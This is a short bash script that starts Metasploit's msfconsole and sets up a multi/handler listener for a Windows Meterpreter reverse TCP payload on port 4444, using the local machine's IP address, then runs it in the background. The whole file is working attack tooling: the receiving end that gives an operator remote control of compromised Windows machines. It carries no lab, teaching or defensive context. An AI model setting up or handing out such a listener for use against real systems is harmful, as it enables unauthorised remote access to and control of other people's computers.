#!/bin/bash

msfconsole -q -x \
"use exploit/multi/handler; \
set PAYLOAD windows/meterpreter/reverse_tcp; \
set LHOST $(hostname -I | cut -d' ' -f1); \
set LPORT 4444; \
exploit -j;"